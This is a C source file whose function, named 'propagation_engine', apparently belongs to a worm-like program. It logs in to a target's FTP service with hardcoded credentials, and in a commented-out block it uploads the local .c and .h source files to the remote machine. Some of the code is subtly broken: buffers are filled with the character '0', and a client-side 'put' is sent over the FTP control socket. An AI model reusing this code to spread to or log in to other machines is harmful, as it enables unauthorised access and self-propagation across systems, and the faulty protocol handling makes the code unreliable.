#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>

void propagation_engine(char* ip){
    int sock = 0, statFolder = 0, statFile = 0, len = 0, size = 0;
    char buffer[1024];
    char user[100] = "USER kath\n";
    char model[100] = "MODE S\n";
    char type[100] = "TYPE I\n";
    char pasv[100] = "PASV\n";
    char pass[100] = "PASS jack\n";
    char cwd[100] = "CWD /home/\n";
    char ls[100] = "STAT\n";
    struct sockaddr_in serverAddr;
    DIR *dir;
    struct dirent *folder;
    struct stat obj;
    FILE *arq;

    //CONNECT FTP
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        printf("Erro ao criar o socket.\n");
        exit(1);
    }  

    memset(&serverAddr, '0', sizeof(serverAddr));
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(21);

    if(connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0){
        printf("Erro: conexao falhou. \n");
        exit(1);
    }

    printf("Sucesso FTP \n");
    /*---Get "Hello?"---*/

    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    memset(buffer, '0', 1024);
    if(send(sock, user, strlen(user), 0) < 0){
        printf("Erro: nome do usuario invalido ou incorreto. \n");
        exit(1);    
    }
    /*---Get "Hello?"---*/

    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    
    if(send(sock, pass, strlen(pass), 0) < 0){
        printf("Erro: senha invalida \n");
        exit(1);
    } 
    /*---Get "Hello?"---*/

    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    memset(buffer, '0', 1024);
    send(sock, model, strlen(model), 0);
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
 
    memset(buffer, '0', 1024);
    send(sock, type, strlen(type), 0);
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    memset(buffer, '0', 1024);
    send(sock, pasv, strlen(pasv), 0);
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    memset(buffer, '0', 1024);
    send(sock, cwd, strlen(cwd), 0);
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    memset(buffer, '0', 1024);
    send(sock, ls, strlen(ls), 0);
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    //pwd
    
    //CD
/*    strcpy(buffer, "CWD /home/");
    strcat(buffer, user);
    send(sock, buffer, 100, 0);
    recv(sock, &statFolder, sizeof(int), 0);
    if(statFolder)
        printf("Remote directory successfully changed\n");
    else
        printf("Remote directory failed to change\n");
*/
    /*---Get "Hello?"---*/

  /*  bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    memset(buffer, '0', 1024);*/
    //pwd
 /*   strcpy(buffer, "pwd");
    send(sock, buffer, 100, 0);
    recv(sock, buffer, 100, 0);
    printf("The path of the remote directory is: %s\n", buffer);

    memset(buffer, '0', 1024);
    //catch files names and transfer via put ftp
    dir = opendir(".");
    if(dir){
        while(folder = readdir(dir)){
            if(!strcmp(folder->d_name, "."))
                continue;
            if(!strcmp(folder->d_name, ".."))
                continue;

            statFile = open(folder->d_name, O_RDONLY);
            if(statFile == -1){
                printf("No such file on the local directory\n\n");
                exit(0);
            } 

            len = strlen(folder->d_name);
            if (((len >= 2) && strcmp (&(folder->d_name[len - 2]), ".h") == 0) || ((len >= 2) && strcmp (&(folder->d_name[len - 2]), ".c") == 0)){
                strcpy(buffer, "put ");
                strcat(buffer, folder->d_name);
                send(sock, buffer, 100, 0);
                stat(folder->d_name, &obj);
                size = obj.st_size;
                send(sock, &size, sizeof(int), 0);
                sendfile(sock, statFile, NULL, size);
                recv(sock, &statFile, sizeof(int), 0);
                if(statFile)
                    printf("File stored successfully\n");
                else
                    printf("File failed to be stored to remote machine\n");
            }
        }
    }*/

    if(sock >= 0){
        close(sock);
    }
}
